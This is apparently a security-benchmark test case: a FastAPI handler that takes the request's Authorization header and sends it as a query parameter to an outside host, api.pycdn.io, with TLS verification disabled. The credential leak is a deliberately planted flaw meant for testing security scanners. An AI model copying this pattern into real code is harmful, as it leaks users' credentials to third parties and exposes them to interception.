# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import asyncio
import requests


async def BenchmarkTest10585(request: Request):
    auth_header = request.headers.get('authorization', '')
    async def fetch_payload():
        await asyncio.sleep(0)
        return auth_header
    data = await fetch_payload()
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return {"updated": True}
